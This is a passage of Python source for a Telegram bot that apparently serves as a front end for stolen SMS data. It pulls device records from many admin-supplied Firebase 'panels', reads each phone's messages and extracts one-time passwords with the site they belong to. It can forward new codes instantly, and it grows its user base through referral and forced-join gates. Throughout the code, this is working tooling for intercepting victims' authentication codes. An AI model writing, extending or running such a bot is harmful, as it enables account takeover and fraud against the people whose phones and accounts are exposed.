         rbtn(sc("Set Welcome Text"), "6204162490515855272", "primary")],
        [rbtn(sc("Add Rotation Media"), "5224607267797606837", "primary"),
         rbtn(sc("View Media"), "5372849966689566579", "primary")],
        [rbtn(sc("Clear Welcome Media"), "5246772116543512028", "danger"),
         rbtn(sc("Clear Rotation"), "5246772116543512028", "danger")],
        [rbtn(sc("Main Menu"), "6206497372176913599", "primary")],
    ], resize_keyboard=True)

def backup_kb() -> ReplyKeyboardMarkup:
    label = "Disable Backup" if AUTO_BACKUP_ENABLED else "Enable Backup"
    eid = "5246772116543512028" if AUTO_BACKUP_ENABLED else "6206479140040743133"
    style = "danger" if AUTO_BACKUP_ENABLED else "success"
    return ReplyKeyboardMarkup([
        [rbtn(sc("Set Backup Target"), "5440621591387980068", "primary"),
         rbtn(sc("Set Backup Times"), "6204162490515855272", "primary")],
        [rbtn(sc(label), eid, style)],
        [rbtn(sc("Send Backup Now"), "5253742260054409879", "success"),
         rbtn(sc("Backup History"), "5372849966689566579", "primary")],
        [rbtn(sc("Main Menu"), "6206497372176913599", "primary")],
    ], resize_keyboard=True)

def clone_kb() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup([
        [rbtn(sc("Add Clone"), "5440621591387980068", "success"),
         rbtn(sc("List Clones"), "5372849966689566579", "primary")],
        [rbtn(sc("Remove Clone"), "5246772116543512028", "danger")],
        [rbtn(sc("Main Menu"), "6206497372176913599", "primary")],
    ], resize_keyboard=True)

def db_kb() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup([
        [rbtn(sc("Export JSON"), "6206497372176913599", "success"),
         rbtn(sc("Export SQLite"), "6206497372176913599", "success")],
        [rbtn(sc("Import File"), "5440621591387980068", "primary")],
        [rbtn(sc("Main Menu"), "6206497372176913599", "primary")],
    ], resize_keyboard=True)

def panels_page_kb(tags: list, page: int, per: int = 12):
    total_pages = max(1, (len(tags) + per - 1) // per)
    page = max(0, min(page, total_pages - 1))
    chunk = tags[page * per:(page + 1) * per]
    rows = []
    row_buf = []
    for tag in chunk:
        row_buf.append(rbtn(tag[:22], "5372849966689566579", "primary"))
        if len(row_buf) == 2:
            rows.append(row_buf); row_buf = []
    if row_buf: rows.append(row_buf)
    nav = []
    if page > 0: nav.append(rbtn("◀ Prev", "6206497372176913599", "primary"))
    nav.append(rbtn(f"{page+1}/{total_pages}", "6206404510689007446", "success"))
    if page < total_pages - 1: nav.append(rbtn("Next ▶", "6206497372176913599", "primary"))
    rows.append(nav)
    rows.append([rbtn(sc("Main Menu"), "6206497372176913599", "primary")])
    return ReplyKeyboardMarkup(rows, resize_keyboard=True), total_pages

def devices_page_kb(devs: list, page: int, per: int = 8):
    total_pages = max(1, (len(devs) + per - 1) // per)
    page = max(0, min(page, total_pages - 1))
    chunk = devs[page * per:(page + 1) * per]
    rows = []
    for i, d in enumerate(chunk):
        lbl = (d.numbers[0] if d.numbers else d.name)[:16]
        icon = "5224607267797606837" if d.status == "online" else "6206479140040743133"
        style = "success" if d.status == "online" else "danger"
        rows.append([rbtn(f"{page*per + i + 1}. {lbl}", icon, style)])
    nav = []
    if page > 0: nav.append(rbtn("◀ Prev", "6206497372176913599", "primary"))
    nav.append(rbtn(f"{page+1}/{total_pages}", "6206404510689007446", "success"))
    if page < total_pages - 1: nav.append(rbtn("Next ▶", "6206497372176913599", "primary"))
    rows.append(nav)
    rows.append([rbtn(sc("Refresh"), "5224607267797606837", "primary"),
                 rbtn(sc("Main Menu"), "6206497372176913599", "primary")])
    return ReplyKeyboardMarkup(rows, resize_keyboard=True), total_pages

# ══════════════════════════════════════════════════════════════════
# TEXT BUILDERS
# ══════════════════════════════════════════════════════════════════
def device_list_text(devs: list) -> str:
    online = sum(1 for d in devs if d.status == "online")
    nums = sum(len(d.numbers) for d in devs if d.numbers)
    return qres("5253742260054409879", "devices list", [
        f"📱 total: <b>{len(devs)}</b>",
        f"🟢 online: <b>{online}</b> · 🔴 offline: <b>{len(devs) - online}</b>",
        f"🔢 numbers: <b>{nums}</b>",
        f"",
        f"<i>select device from keyboard below.</i>",
    ])

def device_detail_text(d: Device, latest_otp: str = None,
                       site: str = None, site_eid: str = None) -> str:
    lines = [
        f"📞 number: <code>{esc(d.numbers[0] if d.numbers else '—')}</code>",
        f"⚙️ name: {esc(d.name[:25])}",
        f"📶 status: <b>{d.status}</b> · 🔋 {d.battery}%",
        f"🔥 panel: <code>{esc(d.db_tag)}</code>",
    ]
    if latest_otp:
        icon = em(site_eid or "5253742260054409879", "🌐")
        lines.append(f"{icon} site: <b>{esc(site or 'unknown')}</b>")
        lines.append(f"🔑 latest otp: <code>{esc(latest_otp)}</code>")
    return qres("5253742260054409879", "device terminal", lines)

# ══════════════════════════════════════════════════════════════════
# /start
# ══════════════════════════════════════════════════════════════════
async def _send_welcome_media(ctx, chat_id: int, caption: str, markup) -> bool:
    if not WELCOME_MEDIA.get("file_id"): return False
    try:
        if WELCOME_MEDIA.get("type") == "photo":
            await ctx.bot.send_photo(chat_id=chat_id, photo=WELCOME_MEDIA["file_id"],
                                     caption=caption, reply_markup=markup,
                                     parse_mode="HTML",
                                     has_spoiler=bool(WELCOME_MEDIA.get("spoiler")))
        else:
            await ctx.bot.send_video(chat_id=chat_id, video=WELCOME_MEDIA["file_id"],
                                     caption=caption, reply_markup=markup,
                                     parse_mode="HTML",
                                     has_spoiler=bool(WELCOME_MEDIA.get("spoiler")))
        return True
    except Exception as e:
        _log.warning(f"welcome media: {e}")
        return False

def _default_welcome_text(uid: int, admin: bool) -> str:
    role = "👑 owner" if admin else "👤 user"
    return qres("5224607267797606837", BOT_BRAND_NAME, [
        f"🆔 your id: <code>{uid}</code>",
        f"🎭 role: {role}",
        f"",
        f"<i>use the keyboard below to navigate.</i>",
    ])

async def cmd_start(update: Update, ctx: ContextTypes) -> None:
    uid = update.effective_chat.id
    user = update.effective_user
    admin = is_admin(uid)

    if all_users.get(uid, {}).get("banned"):
        await update.message.reply_text(q("🚫 <b>you are banned.</b>"), parse_mode="HTML")
        return
    if not admin and MAINTENANCE_MODE:
        await update.message.reply_text(
            q("🛠 <b>maintenance mode</b>\n\n<i>please try again later.</i>"),
            parse_mode="HTML")
        return

    new_user = uid not in all_users
    if new_user:
        all_users[uid] = {
            "name": (user.full_name if user else "user"),
            "username": (user.username or "" if user else ""),
            "joined_at": datetime.now().strftime("%d %b %Y %I:%M %p"),
            "banned": False, "referrals": [], "referral_qualified": False,
            "credits": 0,
        }
    else:
        if user:
            all_users[uid]["name"] = user.full_name
            all_users[uid]["username"] = user.username or ""
    chats_registry.add(uid)
    save_data()

    if ctx.args and str(ctx.args[0]).startswith("ref_"):
        try:
            ref = int(str(ctx.args[0])[4:])
            if ref != uid and ref in all_users and not all_users[uid].get("referred_by"):
                all_users[uid]["referred_by"] = ref
                save_data()
        except Exception: pass

    ready, reason = await gate_state(ctx.bot, uid)
    if not ready:
        if reason == "force_join":
            ikb = [[InlineKeyboardButton(f"🔔 Join {ch.get('channel','')[:20]}",
                                          url=ch.get("url") or "")]
                   for ch in FORCE_JOIN_CHANNELS if (ch.get("url") or "")]
            text = qres("5246772116543512028", "join required",
                        [f"📢 <code>{esc(ch.get('channel'))}</code>" for ch in FORCE_JOIN_CHANNELS]
                        + [f"", "<i>after joining all, send /start again.</i>"])
            await update.message.reply_text(text, parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(ikb) if ikb else None)
            return
        if reason == "referrals":
            refs = referral_count(uid)
            me = await ctx.bot.get_me()
            link = f"https://t.me/{me.username}?start=ref_{uid}"
            await update.message.reply_text(
                qres("5084613633418199991", "referral gate", [
                    f"🎁 referrals: <b>{refs}/{REQUIRED_REFERRALS}</b>",
                    f"",
                    f"🔗 your link:",
                    f"<code>{esc(link)}</code>",
                ]), parse_mode="HTML")
            return

    if not has_access(uid):
        await update.message.reply_text(
            qres("5246772116543512028", "access required",
                 [f"🆔 id: <code>{uid}</code>", "", "<i>contact owner for access.</i>"]),
            parse_mode="HTML")
        return

    text = WELCOME_TEXT.strip() or _default_welcome_text(uid, admin)
    kb = main_menu_kb(admin)
    if not await _send_welcome_media(ctx, uid, text, kb):
        await update.message.reply_text(text, reply_markup=kb, parse_mode="HTML")

# ══════════════════════════════════════════════════════════════════
# TEXT HANDLER
# ══════════════════════════════════════════════════════════════════
async def on_text(update: Update, ctx: ContextTypes) -> None:
    chat = update.effective_chat
    if chat is None: return
    uid = chat.id
    text = (update.message.text or "").strip()

    if all_users.get(uid, {}).get("banned"): return
    admin = is_admin(uid)

    if not admin and MAINTENANCE_MODE:
        await update.message.reply_text(q("🛠 <b>maintenance mode</b>"), parse_mode="HTML")
        return

    if uid in pending_action:
        act = pending_action.pop(uid)
        try:
            if await handle_pending_input(update, ctx, act, text, admin):
                return
        except Exception as e:
            _log.error(f"pending: {e}")
            await update.message.reply_text(q(f"❌ error: <code>{esc(e)}</code>"),
                                            parse_mode="HTML")
            return

    if not has_access(uid) and not admin:
        await update.message.reply_text(q("🚫 <b>access required</b>"), parse_mode="HTML")
        return

    # ── main menu ──────────────────────────────────────────
    if text == sc("Main Menu"):
        await update.message.reply_text(
            qres("5224607267797606837", "main menu",
                 ["<i>choose an option below.</i>"]),
            reply_markup=main_menu_kb(admin), parse_mode="HTML")
        return

    if text == sc("Admin Panel") and admin:
        await update.message.reply_text(
            qres("6206404510689007446", "admin panel",
                 [f"👥 users: <b>{len(all_users)}</b>",
                  f"✅ allowed: <b>{len(allowed_users)}</b>",
                  f"📡 panels: <b>{len(DATABASES)}</b>",
                  f"🎁 referrals: <b>{sum(referral_count(u) for u in all_users)}</b>",
                  f"🔒 locked: <b>{len(ADMIN_ONLY_TAGS)}</b>"]),
            reply_markup=admin_menu_kb(), parse_mode="HTML")
        return

    if text == sc("Devices List") or text == sc("Refresh"):
        devs = await get_all_devices(admin)
        await _show_devices(update, ctx, devs, page=0)
        return

    if text == sc("All Panels"):
        tags = sorted([t for t in DATABASES if admin or t not in ADMIN_ONLY_TAGS])
        kb, _ = panels_page_kb(tags, 0)
        _chat_shortcut_cache[uid] = "panels"
        _chat_page_cache[uid] = 0
        await update.message.reply_text(
            qres("5372849966689566579", "all panels",
                 [f"📡 total: <b>{len(tags)}</b>", "",
                  "<i>select panel below.</i>"]),
            reply_markup=kb, parse_mode="HTML")
        return

    if text == sc("Search Number"):
        pending_action[uid] = {"action": "search_number"}
        await update.message.reply_text(q("🔍 <b>send the number to search:</b>"), parse_mode="HTML")
        return

    if text == sc("Keyword Search"):
        pending_action[uid] = {"action": "search_keyword"}
        await update.message.reply_text(q("🔑 <b>send the keyword to search:</b>"), parse_mode="HTML")
        return

    if text == sc("Recent OTPs"):
        devs = [d for d in await get_all_devices(admin) if d.numbers]
        await _show_recent_otps(update, ctx, devs)
        return

    if text == sc("Panel Status"):
        await _show_panel_status(update, ctx, admin)
        return

    if text == sc("User Hub"):
        await update.message.reply_text(
            qres("5339233635620899144", "user hub",
                 [f"🆔 id: <code>{uid}</code>", "",
                  "<i>select an option below.</i>"]),
            reply_markup=user_hub_kb(), parse_mode="HTML")
        return

    if text == sc("Media Manager") and admin:
        await update.message.reply_text(
            qres("5253742260054409879", "media manager",
                 [f"🎬 welcome media: {'✅ set' if WELCOME_MEDIA.get('file_id') else '❌ not set'}",
                  f"📝 welcome text: {'✅ custom' if WELCOME_TEXT.strip() else '❌ default'}",
                  f"📹 rotation pool: <b>{len(ROTATION_MEDIA)}</b>"]),
            reply_markup=media_kb(), parse_mode="HTML")
        return

    if text == sc("Auto Backup"):
        await update.message.reply_text(_backup_status_text(),
                                        reply_markup=backup_kb(), parse_mode="HTML")
        return

    if text == sc("Clone Bot") and admin:
        await update.message.reply_text(_clone_status_text(),
                                        reply_markup=clone_kb(), parse_mode="HTML")
        return

    if text == sc("Database") and admin:
        await update.message.reply_text(
            qres("6206497372176913599", "database manager",
                 [f"📦 db size: <b>{_size_str(os.path.getsize(DB_FILE) if os.path.exists(DB_FILE) else 0)}</b>",
                  f"👥 users: <b>{len(all_users)}</b>",
                  f"📡 panels: <b>{len(DATABASES)}</b>"]),
            reply_markup=db_kb(), parse_mode="HTML")
        return

    # ── user hub ───────────────────────────────────────────
    if text == sc("My Profile"):
        u = all_users.get(uid, {})
        await update.message.reply_text(
            qres("5339233635620899144", "my profile",
                 [f"🆔 id: <code>{uid}</code>",
                  f"👤 name: {esc(u.get('name', '—'))}",
                  f"🔗 username: @{esc(u.get('username') or 'none')}",
                  f"📅 joined: {esc(u.get('joined_at', '—'))}",
                  f"✅ access: <b>{'yes' if has_access(uid) else 'no'}</b>",
                  f"🎁 referrals: <b>{referral_count(uid)}/{REQUIRED_REFERRALS}</b>"]),
            reply_markup=user_hub_kb(), parse_mode="HTML")
        return

    if text == sc("My Stats"):
        u = all_users.get(uid, {})
        await update.message.reply_text(
            qres("5206318837489743801", "my stats",
                 [f"📡 panels available: <b>{len([t for t in DATABASES if admin or t not in ADMIN_ONLY_TAGS])}</b>",
                  f"🎁 my referrals: <b>{referral_count(uid)}</b>",
                  f"🏁 qualified: <b>{'yes' if u.get('referral_qualified') else 'no'}</b>"]),
            reply_markup=user_hub_kb(), parse_mode="HTML")
        return

    if text == sc("My OTPs"):
        history = USER_OTP_HISTORY.get(uid, [])
        if not history:
            await update.message.reply_text(
                qres("5206318837489743801", "my otps",
                     ["📭 <i>no otp history yet.</i>", "",
                      "📡 use <b>Devices List</b> or <b>Search</b> to view otps.",
                      "🔑 every otp you view will appear here automatically."]),
                reply_markup=user_hub_kb(), parse_mode="HTML")
            return
        entries = history[:30]
        lines = []
        for i, e in enumerate(entries, 1):
            icon = em(e["site_eid"], "🌐")
            ts_i = e["ts"]
            try:
                dt = datetime.fromtimestamp(ts_i / 1000).strftime("%d %b %Y · %I:%M %p")
            except Exception:
                dt = "—"
            lines.append(
                f"{i}. {icon} <b>{esc(e['site'])}</b>\n"
                f"    🔑 <code>{esc(e['otp'])}</code>   "
                f"📞 <code>{esc(e['number'])}</code>\n"
                f"    📅 {dt}\n"
                f"    🔥 <code>{esc(e['panel'][:18])}</code>"
            )
        total = len(history)
        footer = f"<i>showing 1–{len(entries)} of {total} · newest first</i>"
        await update.message.reply_text(
            qres("5206318837489743801", f"my otps ({total})",
                 lines + ["", footer]),
            reply_markup=user_hub_kb(), parse_mode="HTML")
        return

    if text == sc("My Referrals"):
        me = await ctx.bot.get_me()
        link = f"https://t.me/{me.username}?start=ref_{uid}"
        await update.message.reply_text(
            qres("5084613633418199991", "my referrals",
                 [f"🎁 qualified: <b>{referral_count(uid)}/{REQUIRED_REFERRALS}</b>",
                  f"",
                  f"🔗 your link:",
                  f"<code>{esc(link)}</code>"]),
            reply_markup=user_hub_kb(), parse_mode="HTML")
        return

    if text == sc("Support"):
        await update.message.reply_text(
            qres("5253742260054409879", "support",
                 [f"👤 owner: <b>{esc(OWNER_DISPLAY_NAME)}</b>",
                  f"💬 contact: {esc(OWNER_CONTACT)}"]),
            reply_markup=user_hub_kb(), parse_mode="HTML")
        return

    if text == sc("Ping"):
        t0 = time.time()
        await update.message.reply_text(
            qres("5253742260054409879", "pong",
                 [f"⚡ latency: <b>{int((time.time()-t0)*1000)}ms</b>",
                  f"🤖 bot: @{esc(BOT_USERNAME.lstrip('@'))}",
                  f"📡 panels: <b>{len(DATABASES)}</b>"]),
            parse_mode="HTML")
        return

    # ── admin buttons ──────────────────────────────────────
    if admin:
        if text in (sc("Add DB (Active Only)"), sc("Add DB (All)")):
            mode = "active" if text == sc("Add DB (Active Only)") else "all"
            pending_action[uid] = {"action": "add_dbs", "mode": mode}
            hint = ("✅ only firebases WITH recent OTP activity will be added."
                    if mode == "active" else
                    "📦 all firebases will be added (no filtering).")
            await update.message.reply_text(
                qres("5440621591387980068", f"add dbs — {mode}",
                     [hint, "",
                      "📝 format (one per line, in message OR upload .txt):",
                      "<code>TAG = https://xxx.firebaseio.com</code>",
                      "<code>https://yyy.firebaseio.com</code>",
                      "", "<i>send /cancel to abort.</i>"]),
                parse_mode="HTML")
            return

        if text == sc("Purge Dead DBs"):
            await _purge_dead_fbs(update, ctx)
            return

        if text == sc("List DBs"):
            await _list_all_dbs(update, ctx)
            return

        if text == sc("User Manager"):
            await _user_manager_menu(update, ctx)
            return

        if text == sc("Access Control"):
            await update.message.reply_text(
                qres("5339286072876614251", "access control",
                     [f"✅ allowed: <b>{len(allowed_users)}</b>",
                      f"🔒 access gate: <b>{'on' if GRANT_ACCESS_REQUIRED else 'off'}</b>"]),
                reply_markup=ReplyKeyboardMarkup([
                    [rbtn(sc("Grant Access"), "6206479140040743133", "success"),
                     rbtn(sc("Revoke Access"), "5246772116543512028", "danger")],
                    [rbtn(sc("View Allowed List"), "5372849966689566579", "primary"),
                     rbtn(sc("Toggle Gate"), "5235588635885054955", "primary")],
                    [rbtn(sc("Admin Panel"), "6206404510689007446", "primary")],
                ], resize_keyboard=True), parse_mode="HTML")
            return

        if text == sc("Grant Access"):
            pending_action[uid] = {"action": "grant_access"}
            await update.message.reply_text(
                q("✅ <b>send user id or @username to grant access:</b>"),
                parse_mode="HTML"); return

        if text == sc("Revoke Access"):
            pending_action[uid] = {"action": "revoke_access"}
            await update.message.reply_text(
                q("❌ <b>send user id to revoke access:</b>"),
                parse_mode="HTML"); return

        if text == sc("View Allowed List"):
            if not allowed_users:
                await update.message.reply_text(q("📋 <b>allowed list is empty.</b>"),
                                                parse_mode="HTML"); return
            lines = [f"• <code>{u}</code> — {esc(all_users.get(u, {}).get('name','—'))}"
                     for u in sorted(allowed_users)[:50]]
            await update.message.reply_text(qres("5372849966689566579", "allowed list", lines),
                                            parse_mode="HTML")
            return

        if text == sc("Toggle Gate"):
            global GRANT_ACCESS_REQUIRED
            GRANT_ACCESS_REQUIRED = not GRANT_ACCESS_REQUIRED
            save_data()
            await update.message.reply_text(
                q(f"🔒 access gate: <b>{'on' if GRANT_ACCESS_REQUIRED else 'off'}</b>"),
                parse_mode="HTML"); return

        if text == sc("Force Join"):
            await _force_join_menu(update, ctx)
            return

        if text == sc("Add Force Join"):
            pending_action[uid] = {"action": "fj_add"}
            await update.message.reply_text(
                q("📢 <b>send channel username or id + link:</b>\n"
                  "<code>@mychannel</code>\n"
                  "<code>-1001234567890 | https://t.me/+xxxxx</code>"),
                parse_mode="HTML"); return

        if text == sc("Toggle Force Join"):
            global FORCE_JOIN_ENABLED
            FORCE_JOIN_ENABLED = not FORCE_JOIN_ENABLED
            save_data()
            await update.message.reply_text(
                q(f"🔒 force join: <b>{'on' if FORCE_JOIN_ENABLED else 'off'}</b>"),
                parse_mode="HTML"); return

        if text == sc("Referral Gate"):
            await update.message.reply_text(
                qres("5084613633418199991", "referral gate",
                     [f"state: <b>{'on' if REFERRAL_ENABLED else 'off'}</b>",
                      f"required: <b>{REQUIRED_REFERRALS}</b> referrals"]),
                reply_markup=ReplyKeyboardMarkup([
                    [rbtn(sc("Toggle Referral"), "5235588635885054955", "primary"),
                     rbtn(sc("Set Required"), "6204162490515855272", "primary")],
                    [rbtn(sc("Admin Panel"), "6206404510689007446", "primary")],
                ], resize_keyboard=True), parse_mode="HTML")
            return

        if text == sc("Toggle Referral"):
            global REFERRAL_ENABLED
            REFERRAL_ENABLED = not REFERRAL_ENABLED
            save_data()
            await update.message.reply_text(
                q(f"🎁 referral gate: <b>{'on' if REFERRAL_ENABLED else 'off'}</b>"),
                parse_mode="HTML"); return

        if text == sc("Set Required"):
            pending_action[uid] = {"action": "set_required_refs"}
            await update.message.reply_text(
                q(f"👥 <b>required referrals (current: {REQUIRED_REFERRALS}):</b>"),
                parse_mode="HTML"); return

        if text == sc("Broadcast"):
            pending_action[uid] = {"action": "broadcast"}
            await update.message.reply_text(
                q("📢 <b>send the message to broadcast:</b>\n\n"
                  "<i>any media, formatting, or buttons will be copied exactly.</i>"),
                parse_mode="HTML"); return

        if text == sc("Dashboard"):
            await update.message.reply_text(
                qres("5206318837489743801", "dashboard",
                     [f"👥 users: <b>{len(all_users)}</b>",
                      f"✅ allowed: <b>{len(allowed_users)}</b>",
                      f"📡 panels: <b>{len(DATABASES)}</b>",
                      f"🔒 admin-only: <b>{len(ADMIN_ONLY_TAGS)}</b>",
                      f"🤖 clones: <b>{len(CLONES)}</b>",
                      f"💾 auto-backup: <b>{'on' if AUTO_BACKUP_ENABLED else 'off'}</b>",
                      f"👁 watching: <b>{len(user_focus)}</b> users"]),
                reply_markup=admin_menu_kb(), parse_mode="HTML"); return

        if text == sc("Maintenance"):
            global MAINTENANCE_MODE
            MAINTENANCE_MODE = not MAINTENANCE_MODE
            save_data()
            await update.message.reply_text(
                q(f"🛠 maintenance: <b>{'on' if MAINTENANCE_MODE else 'off'}</b>"),
                parse_mode="HTML"); return

        if text == sc("Logs"):
            await update.message.reply_text(
                qres("6204162490515855272", "system info",
                     [f"📡 panels: <b>{len(DATABASES)}</b>",
                      f"👥 users: <b>{len(all_users)}</b>",
                      f"🧠 seen ids: <b>{len(seen_ids)}</b>",
                      f"🤖 clones active: <b>{len(CLONE_APPS)}</b>",
                      f"👁 watching: <b>{len(user_focus)}</b> devices"]),
                parse_mode="HTML"); return

    # ── media ──────────────────────────────────────────────
    if admin and text == sc("Set Welcome Media"):
        pending_action[uid] = {"action": "set_welcome_media"}
        await update.message.reply_text(q("🎬 <b>send photo or video for welcome:</b>"),
                                        parse_mode="HTML"); return

    if admin and text == sc("Set Welcome Text"):
        pending_action[uid] = {"action": "set_welcome_text"}
        await update.message.reply_text(q("📝 <b>send welcome caption text (HTML supported):</b>"),
                                        parse_mode="HTML"); return

    if admin and text == sc("Add Rotation Media"):
        pending_action[uid] = {"action": "add_rotation_media"}
        await update.message.reply_text(q("📹 <b>send photo/video to add to rotation pool:</b>"),
                                        parse_mode="HTML"); return

    if admin and text == sc("View Media"):
        lines = [
            f"🎬 welcome: {'✅ set' if WELCOME_MEDIA.get('file_id') else '❌ not set'}",
            f"📝 text: {'✅ custom' if WELCOME_TEXT.strip() else '❌ default'}",
            f"📹 rotation: <b>{len(ROTATION_MEDIA)}</b> items",
        ]
        await update.message.reply_text(qres("5253742260054409879", "media status", lines),
                                        reply_markup=media_kb(), parse_mode="HTML"); return

    if admin and text == sc("Clear Welcome Media"):
        WELCOME_MEDIA["file_id"] = None; save_data()
        await update.message.reply_text(q("🗑 <b>welcome media cleared.</b>"),
                                        parse_mode="HTML"); return

    if admin and text == sc("Clear Rotation"):
        ROTATION_MEDIA.clear(); save_data()
        await update.message.reply_text(q("🗑 <b>rotation cleared.</b>"),
                                        parse_mode="HTML"); return

    # ── auto backup ────────────────────────────────────────
    if admin and text == sc("Set Backup Target"):
        pending_action[uid] = {"action": "set_backup_target"}
        await update.message.reply_text(
            q("🎯 <b>send private gc chat id (e.g. -100123...):</b>"),
            parse_mode="HTML"); return

    if admin and text == sc("Set Backup Times"):
        pending_action[uid] = {"action": "set_backup_times"}
        await update.message.reply_text(
            q("⏰ <b>send times in 24h format, comma separated:</b>\n"
              "<code>03:00,15:00,21:00</code>"), parse_mode="HTML"); return

    if admin and text in (sc("Enable Backup"), sc("Disable Backup")):
        global AUTO_BACKUP_ENABLED
        if text == sc("Enable Backup"):
            if not AUTO_BACKUP_CHAT or not AUTO_BACKUP_TIMES:
                await update.message.reply_text(q("❌ <b>set target and times first.</b>"),
                                                parse_mode="HTML"); return
            AUTO_BACKUP_ENABLED = True
        else:
            AUTO_BACKUP_ENABLED = False
        save_data()
        await update.message.reply_text(_backup_status_text(),
                                        reply_markup=backup_kb(), parse_mode="HTML"); return

    if admin and text == sc("Send Backup Now"):
        if not AUTO_BACKUP_CHAT:
            await update.message.reply_text(q("❌ <b>no backup target set.</b>"),
                                            parse_mode="HTML"); return
        ok = await _send_backup(ctx.bot, manual=True)
        await update.message.reply_text(
            q("✅ <b>backup sent.</b>" if ok else "❌ <b>backup failed.</b>"),
            parse_mode="HTML"); return

    if admin and text == sc("Backup History"):
        lines = [f"• last 3 stored in <code>{BACKUP_DIR}</code>"]
        try:
            files = sorted(os.listdir(BACKUP_DIR))[-3:]
            for f in files: lines.append(f"  📄 {esc(f)}")
        except Exception: pass
        await update.message.reply_text(qres("5372849966689566579", "backup history", lines),
                                        reply_markup=backup_kb(), parse_mode="HTML"); return

    # ── clone ──────────────────────────────────────────────
    if admin and text == sc("Add Clone"):
        pending_action[uid] = {"action": "add_clone"}
        await update.message.reply_text(q("🤖 <b>send the clone bot token:</b>"),
                                        parse_mode="HTML"); return

    if admin and text == sc("List Clones"):
        await update.message.reply_text(_clone_status_text(),
                                        reply_markup=clone_kb(), parse_mode="HTML"); return

    if admin and text == sc("Remove Clone"):
        if not CLONES:
            await update.message.reply_text(q("❌ <b>no clones to remove.</b>"),
                                            parse_mode="HTML"); return
        rows = [[rbtn(f"🗑 {c.get('username','?')}", "5246772116543512028", "danger")]
                for c in CLONES]
        rows.append([rbtn(sc("Clone Bot"), "5235588635885054955", "primary")])
        await update.message.reply_text(
            qres("5246772116543512028", "remove clone", ["<i>select clone to remove.</i>"]),
            reply_markup=ReplyKeyboardMarkup(rows, resize_keyboard=True), parse_mode="HTML"); return

    for c in CLONES:
        if text == f"🗑 {c.get('username', '?')}":
            await _stop_clone(c.get("token", ""))
            CLONES.remove(c); save_data()
            await update.message.reply_text(
                q(f"🗑 <b>clone removed: @{esc(c.get('username','?'))}</b>"),
                reply_markup=clone_kb(), parse_mode="HTML")
            return

    # ── db ────────────────────────────────────────────────
    if admin and text == sc("Export JSON"):
        await ctx.bot.send_document(uid,
            document=db_snapshot_bytes(),
            filename=f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
            caption=q("📤 <b>json export</b>"), parse_mode="HTML")
        return

    if admin and text == sc("Export SQLite"):
        try:
            blob = export_sqlite_bytes()
            await ctx.bot.send_document(uid, document=blob,
                filename=f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.sqlite",
                caption=q("📤 <b>sqlite export</b>"), parse_mode="HTML")
        except Exception as e:
            await update.message.reply_text(q(f"❌ <code>{esc(e)}</code>"), parse_mode="HTML")
        return

    if admin and text == sc("Import File"):
        pending_action[uid] = {"action": "import_file"}
        await update.message.reply_text(
            q("📥 <b>upload .json or .sqlite file to import:</b>\n\n"
              "<i>existing data will be merged.</i>"), parse_mode="HTML"); return

    # ── watch device ──────────────────────────────────────
    if text == sc("Watch Device"):
        shortcut = _chat_shortcut_cache.get(uid, "")
        if not shortcut.startswith("device:"):
            await update.message.reply_text(
                q("❌ <b>open a device first, then tap Watch.</b>"),
                parse_mode="HTML"); return
        dev_id = shortcut.split(":", 1)[1]
        user_focus[uid] = dev_id
        save_data()
        await update.message.reply_text(
            qres("5253742260054409879", "watching device",
                 ["🔔 <i>any new otp on this device will be dm'd to you instantly.</i>",
                  f"",
                  f"🆔 device: <code>{esc(dev_id[:20])}</code>",
                  f"",
                  f"<i>tap Stop Watching on the device screen to disable.</i>"]),
            reply_markup=ReplyKeyboardMarkup([
                [rbtn(sc("Stop Watching"), "5246772116543512028", "danger"),
                 rbtn(sc("Main Menu"), "6206497372176913599", "primary")],
            ], resize_keyboard=True), parse_mode="HTML")
        return

    if text == sc("Stop Watching"):
        was = user_focus.pop(uid, None)
        save_data()
        if was:
            await update.message.reply_text(
                q("🔕 <b>stopped watching.</b>"),
                reply_markup=main_menu_kb(admin), parse_mode="HTML")
        else:
            await update.message.reply_text(
                q("ℹ️ <b>you were not watching any device.</b>"),
                reply_markup=main_menu_kb(admin), parse_mode="HTML")
        return

    # ── panel tap ──────────────────────────────────────────
    for tag in DATABASES:
        if text == tag[:22]:
            await _show_panel_devices(update, ctx, tag); return

    # ── device tap "N. number" ─────────────────────────────
    m = re.fullmatch(r"(\d+)\.\s*(.+)", text)
    if m:
        idx = int(m.group(1))
        devs = await get_all_devices(admin)
        if 1 <= idx <= len(devs):
            await _show_device_terminal(update, ctx, devs[idx - 1]); return

    # ── pagination ─────────────────────────────────────────
    if text in ("◀ Prev", "Next ▶") or re.fullmatch(r"\d+/\d+", text):
        await _handle_pagination(update, ctx, text, admin); return

    await update.message.reply_text(
        q("❓ <b>unknown command.</b>\n\n<i>send /start to reset.</i>"),
        reply_markup=main_menu_kb(admin), parse_mode="HTML")

# ══════════════════════════════════════════════════════════════════
# SHOW HELPERS
# ══════════════════════════════════════════════════════════════════
async def _show_devices(update: Update, ctx: ContextTypes, devs: list, page: int) -> None:
    if not devs:
        await update.message.reply_text(q("📭 <b>no devices online.</b>"), parse_mode="HTML"); return
    kb, pages = devices_page_kb(devs, page)
    _chat_shortcut_cache[update.effective_chat.id] = "devices"
    _chat_page_cache[update.effective_chat.id] = page
    await update.message.reply_text(device_list_text(devs) + f"\n\n<i>page {page+1}/{pages}</i>",
                                    reply_markup=kb, parse_mode="HTML")

async def _show_device_terminal(update: Update, ctx: ContextTypes, d: Device) -> None:
    uid = update.effective_chat.id
    otp = None
    num = d.numbers[0] if d.numbers else d.name
    detected_site = None
    detected_eid = None
    try:
        recent = await get_device_sms(d, limit=10)
        for s in recent:
            body = s.get("body") or s.get("message") or s.get("text") or ""
            o = extract_otp(body)
            if o:
                if not otp:
                    otp = o
                    detected_site, detected_eid = _detect_site(s.get("sender", ""), body)
                _log_user_otp(uid=uid, number=num,
                              sender=s.get("sender", "—"),
                              otp=o, body=body,
                              ts=int(s.get("timestamp") or 0),
                              panel=d.db_tag)
    except Exception:
        pass

    text = device_detail_text(d, otp, site=detected_site, site_eid=detected_eid)
    watching = user_focus.get(uid) == d.id
    watch_label = "Stop Watching" if watching else "Watch Device"
    watch_eid = "5246772116543512028" if watching else "5253742260054409879"
    watch_style = "danger" if watching else "success"

    kb = ReplyKeyboardMarkup([
        [rbtn(sc(watch_label), watch_eid, watch_style),
